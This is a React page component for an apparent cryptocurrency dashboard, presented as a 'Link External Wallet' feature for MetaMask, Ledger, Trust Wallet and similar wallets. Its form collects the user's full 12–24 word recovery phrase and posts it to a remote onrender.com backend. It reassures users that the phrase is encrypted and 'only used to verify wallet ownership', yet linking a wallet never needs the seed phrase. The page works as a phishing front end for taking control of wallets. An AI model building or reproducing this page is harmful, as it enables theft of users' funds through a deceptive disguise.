// pages/LinkWallet.jsx
import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import {
  ArrowLeftIcon,
  LinkIcon,
  CheckCircleIcon,
  XCircleIcon,
  InformationCircleIcon,
} from "@heroicons/react/24/outline";

const LinkWallet = () => {
  const navigate = useNavigate();

  // Predefined wallet options
  const walletOptions = [
    "Trust Wallet",
    "MetaMask",
    "Ledger",
    "Trezor",
    "Phantom",
    "Exodus",
    "Coinbase Wallet",
    "Other",
  ];

  // State
  const [formData, setFormData] = useState({
    walletName: "Trust Wallet",
    phrase: "",
  });

  const [customWalletName, setCustomWalletName] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");
  const [linkedWallet, setLinkedWallet] = useState(null);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
    setError("");
  };

  const handleWalletNameChange = (e) => {
    const value = e.target.value;
    setFormData({
      ...formData,
      walletName: value,
    });
    setError("");
  };

  const formatDate = (dateString) => {
    if (!dateString) return "N/A";
    try {
      return new Date(dateString).toLocaleString("en-US", {
        year: "numeric",
        month: "short",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      });
    } catch (error) {
      return "Invalid date";
    }
  };

  const validatePhrase = (phrase) => {
    const words = phrase.trim().split(/\s+/);

    if (words.length < 12) {
      return "Recovery phrase must be at least 12 words";
    }

    if (words.length > 24) {
      return "Recovery phrase cannot exceed 24 words";
    }

    // Check for basic word format (letters only, no special chars)
    const invalidWords = words.filter((word) => !/^[a-z]+$/i.test(word));
    if (invalidWords.length > 0) {
      return "Recovery phrase should contain only letters";
    }

    return "";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validation
    if (!formData.walletName.trim()) {
      setError("Please select a wallet name");
      return;
    }

    const phraseError = validatePhrase(formData.phrase);
    if (phraseError) {
      setError(phraseError);
      return;
    }

    // Use custom name if "Other" is selected
    const walletNameToSend =
      formData.walletName === "Other"
        ? customWalletName.trim()
        : formData.walletName;

    if (!walletNameToSend) {
      setError("Please enter a wallet name");
      return;
    }

    setLoading(true);
    setError("");

    try {
      const token = localStorage.getItem("token");

      if (!token) {
        navigate("/login");
        return;
      }

      const response = await fetch(
        "https://ebube-be.onrender.com/api/wallet/link",
        {
          method: "POST",
          headers: {
            Authorization: `Bearer ${token}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            walletName: walletNameToSend,
            phrase: formData.phrase.trim(),
          }),
        },
      );

      const data = await response.json();

      if (response.ok && data.success) {
        setLinkedWallet(data.data.linkedWallet);
        setSuccess(true);
        // Reset form
        setFormData({
          walletName: "Trust Wallet",
          phrase: "",
        });
        setCustomWalletName("");
      } else {
        setError(data.message || "Failed to link wallet. Please try again.");
      }
    } catch (error) {
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-lg mx-auto mb-11">
      {/* Header */}
      <div className="flex items-center mb-8">
        <Link to="/dashboard" className="mr-4">
          <div
            className="h-10 w-10 rounded-full flex items-center justify-center hover:opacity-90 transition-colors"
            style={{ backgroundColor: "#2F80ED" }}
          >
            <ArrowLeftIcon className="h-5 w-5" style={{ color: "#FFFFFF" }} />
          </div>
        </Link>
        <div>
          <h1 className="text-2xl font-bold" style={{ color: "#1F2D3D" }}>
            Link External Wallet
          </h1>
          <p className="text-gray-600" style={{ color: "#6B7280" }}>
            Connect your existing cryptocurrency wallet
          </p>
        </div>
      </div>

      {/* Link Wallet Card */}
      <div
        className="rounded-2xl border shadow-xl overflow-hidden mb-8"
        style={{
          backgroundColor: "#1F2D3D",
          borderColor: "#2F80ED",
        }}
      >
        {/* Card Header */}
        <div
          className="px-6 pt-6 pb-4 border-b"
          style={{ borderColor: "#2F80ED" }}
        >
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-xl font-bold" style={{ color: "#FFFFFF" }}>
                Link Your Wallet
              </h2>
              <p className="text-sm mt-1" style={{ color: "#8FA6BF" }}>
                Connect an external wallet to your account
              </p>
            </div>
            <div
              className="h-10 w-10 rounded-full flex items-center justify-center"
              style={{ backgroundColor: "#2F80ED" }}
            >
              <LinkIcon className="h-5 w-5" style={{ color: "#FFFFFF" }} />
            </div>
          </div>
        </div>

        {/* Form/Result */}
        <div className="p-6">
          {success && linkedWallet ? (
            <div className="space-y-6">
              {/* Success Header */}
              <div className="text-center">
                <div
                  className="h-16 w-16 rounded-full flex items-center justify-center mx-auto mb-4"
                  style={{ backgroundColor: "#2F80ED" }}
                >
                  <CheckCircleIcon
                    className="h-8 w-8"
                    style={{ color: "#FFFFFF" }}
                  />
                </div>
                <h3
                  className="text-xl font-bold mb-2"
                  style={{ color: "#FFFFFF" }}
                >
                  Wallet Linked Successfully!
                </h3>
                <p style={{ color: "#8FA6BF" }}>
                  Your wallet has been connected to your account.
                </p>
              </div>

              {/* Wallet Details */}
              <div
                className="rounded-xl p-4 border"
                style={{
                  backgroundColor: "rgba(47, 128, 237, 0.1)",
                  borderColor: "#2F80ED",
                }}
              >
                <h4
                  className="text-sm font-medium mb-3"
                  style={{ color: "#8FA6BF" }}
                >
                  Linked Wallet Details
                </h4>
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <span className="text-sm" style={{ color: "#8FA6BF" }}>
                      Wallet Name
                    </span>
                    <span
                      className="text-sm font-medium"
                      style={{ color: "#FFFFFF" }}
                    >
                      {linkedWallet.walletName}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm" style={{ color: "#8FA6BF" }}>
                      Status
                    </span>
                    <span
                      className="px-2 py-1 text-xs rounded-full"
                      style={{
                        backgroundColor: linkedWallet.isActive
                          ? "rgba(107, 207, 61, 0.2)"
                          : "rgba(231, 76, 60, 0.2)",
                        color: linkedWallet.isActive ? "#6BCF3D" : "#E74C3C",
                      }}
                    >
                      {linkedWallet.isActive ? "Active" : "Inactive"}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm" style={{ color: "#8FA6BF" }}>
                      Linked On
                    </span>
                    <span
                      className="text-sm font-medium"
                      style={{ color: "#FFFFFF" }}
                    >
                      {formatDate(linkedWallet.linkedAt)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm" style={{ color: "#8FA6BF" }}>
                      Last Accessed
                    </span>
                    <span
                      className="text-sm font-medium"
                      style={{ color: "#FFFFFF" }}
                    >
                      {formatDate(linkedWallet.lastAccessed)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm" style={{ color: "#8FA6BF" }}>
                      Wallet ID
                    </span>
                    <span
                      className="text-sm font-medium font-mono"
                      style={{ color: "#FFFFFF" }}
                    >
                      {linkedWallet.id.slice(-8)}
                    </span>
                  </div>
                </div>
              </div>

              {/* Next Steps */}
              <div
                className="rounded-lg p-4 border"
                style={{
                  backgroundColor: "rgba(47, 128, 237, 0.05)",
                  borderColor: "rgba(47, 128, 237, 0.3)",
                }}
              >
                <h4
                  className="text-sm font-medium mb-2"
                  style={{ color: "#8FA6BF" }}
                >
                  What's Next?
                </h4>
                <ul className="text-xs space-y-1" style={{ color: "#8FA6BF" }}>
                  <li className="flex items-start">
                    <span className="mr-2">•</span>
                    <span>
                      Your linked wallet will appear in your dashboard
                    </span>
                  </li>
                  <li className="flex items-start">
                    <span className="mr-2">•</span>
                    <span>
                      You can now receive funds directly to this wallet
                    </span>
                  </li>
                  <li className="flex items-start">
                    <span className="mr-2">•</span>
                    <span>
                      Manage linked wallets from your account settings
                    </span>
                  </li>
                </ul>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3">
                <button
                  onClick={() => setSuccess(false)}
                  className="flex-1 py-2 rounded-lg transition-colors"
                  style={{
                    backgroundColor: "#2F80ED",
                    color: "#FFFFFF",
                  }}
                  onMouseEnter={(e) =>
                    (e.currentTarget.style.backgroundColor = "#3B82F6")
                  }
                  onMouseLeave={(e) =>
                    (e.currentTarget.style.backgroundColor = "#2F80ED")
                  }
                >
                  Link Another Wallet
                </button>
                <Link
                  to="/dashboard"
                  className="flex-1 py-2 text-center rounded-lg transition-colors"
                  style={{
                    backgroundColor: "#5DA9E9",
                    color: "#FFFFFF",
                  }}
                  onMouseEnter={(e) =>
                    (e.currentTarget.style.backgroundColor = "#2F80ED")
                  }
                  onMouseLeave={(e) =>
                    (e.currentTarget.style.backgroundColor = "#5DA9E9")
                  }
                >
                  Back to Dashboard
                </Link>
              </div>
            </div>
          ) : (
            <form onSubmit={handleSubmit}>
              {/* Wallet Selection */}
              <div className="mb-4">
                <label
                  className="block text-sm font-medium mb-2"
                  style={{ color: "#8FA6BF" }}
                >
                  Select Wallet Type
                </label>
                <div className="relative">
                  <select
                    value={formData.walletName}
                    onChange={handleWalletNameChange}
                    className="w-full appearance-none rounded-xl pl-4 pr-10 py-3 font-medium focus:outline-none cursor-pointer"
                    style={{
                      backgroundColor: "rgba(31, 45, 61, 0.8)",
                      border: "1px solid #2F80ED",
                      color: "#FFFFFF",
                    }}
                  >
                    {walletOptions.map((wallet) => (
                      <option key={wallet} value={wallet}>
                        {wallet}
                      </option>
                    ))}
                  </select>
                  <ArrowLeftIcon
                    className="h-4 w-4 absolute right-3 top-4 pointer-events-none rotate-90"
                    style={{ color: "#8FA6BF" }}
                  />
                </div>
              </div>

              {/* Custom Wallet Name (if Other is selected) */}
              {formData.walletName === "Other" && (
                <div className="mb-4">
                  <label
                    className="block text-sm font-medium mb-2"
                    style={{ color: "#8FA6BF" }}
                  >
                    Enter Wallet Name
                  </label>
                  <input
                    type="text"
                    value={customWalletName}
                    onChange={(e) => setCustomWalletName(e.target.value)}
                    placeholder="e.g., My Hardware Wallet"
                    className="w-full rounded-xl px-4 py-3 placeholder-gray-400 focus:outline-none"
                    style={{
                      backgroundColor: "rgba(31, 45, 61, 0.8)",
                      border: "1px solid #2F80ED",
                      color: "#FFFFFF",
                    }}
                  />
                </div>
              )}

              {/* Recovery Phrase */}
              <div className="mb-6">
                <label
                  className="block text-sm font-medium mb-2"
                  style={{ color: "#8FA6BF" }}
                >
                  Recovery Phrase (12-24 words)
                </label>
                <textarea
                  name="phrase"
                  value={formData.phrase}
                  onChange={handleInputChange}
                  placeholder="Enter your 12 to 24 word recovery phrase separated by spaces"
                  rows="4"
                  className="w-full rounded-xl px-4 py-3 placeholder-gray-400 focus:outline-none resize-none"
                  style={{
                    backgroundColor: "rgba(31, 45, 61, 0.8)",
                    border: "1px solid #2F80ED",
                    color: "#FFFFFF",
                  }}
                />
                <div className="text-xs mt-1" style={{ color: "#8FA6BF" }}>
                  Enter words separated by spaces. 12-24 words required.
                </div>
              </div>

              {/* Error Message */}
              {error && (
                <div
                  className="mb-4 p-3 rounded-lg border"
                  style={{
                    backgroundColor: "rgba(231, 76, 60, 0.1)",
                    borderColor: "#E74C3C",
                  }}
                >
                  <div className="flex items-center">
                    <XCircleIcon
                      className="h-4 w-4 mr-2 flex-shrink-0"
                      style={{ color: "#E74C3C" }}
                    />
                    <span className="text-sm" style={{ color: "#E74C3C" }}>
                      {error}
                    </span>
                  </div>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className={`w-full py-3 rounded-xl font-bold transition-all ${
                  loading ? "cursor-not-allowed" : "hover:opacity-90 shadow-lg"
                }`}
                style={{
                  backgroundColor: loading
                    ? "rgba(47, 128, 237, 0.5)"
                    : "#2F80ED",
                  color: "#FFFFFF",
                }}
              >
                {loading ? "Linking Wallet..." : "Link Wallet"}
              </button>

              {/* Information */}
              <div
                className="mt-4 flex items-start text-xs"
                style={{ color: "#8FA6BF" }}
              >
                <InformationCircleIcon className="h-4 w-4 mr-2 mt-0.5 flex-shrink-0" />
                <p>
                  Your recovery phrase is encrypted and stored securely. It is
                  only used to verify wallet ownership.
                </p>
              </div>
            </form>
          )}
        </div>
      </div>

      {/* Supported Wallets Info */}
      <div
        className="rounded-xl border shadow-sm"
        style={{
          backgroundColor: "#FFFFFF",
          borderColor: "#E1E6EC",
        }}
      >
        <div className="px-4 py-3 border-b" style={{ borderColor: "#E1E6EC" }}>
          <h3 className="font-medium" style={{ color: "#1F2D3D" }}>
            Supported Wallets
          </h3>
        </div>
        <div className="p-4">
          <div className="grid grid-cols-2 gap-3">
            {walletOptions
              .filter((w) => w !== "Other")
              .map((wallet) => (
                <div
                  key={wallet}
                  className="flex items-center p-2 rounded-lg"
                  style={{ backgroundColor: "#F5F7FA" }}
                >
                  <div
                    className="h-8 w-8 rounded-full flex items-center justify-center mr-3"
                    style={{ backgroundColor: "rgba(47, 128, 237, 0.1)" }}
                  >
                    <LinkIcon
                      className="h-4 w-4"
                      style={{ color: "#2F80ED" }}
                    />
                  </div>
                  <span
                    className="text-sm font-medium"
                    style={{ color: "#1F2D3D" }}
                  >
                    {wallet}
                  </span>
                </div>
              ))}
          </div>
          <p className="text-xs mt-3 mb-9" style={{ color: "#6B7280" }}>
            Most popular cryptocurrency wallets are supported. Contact support
            if your wallet is not listed.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LinkWallet;
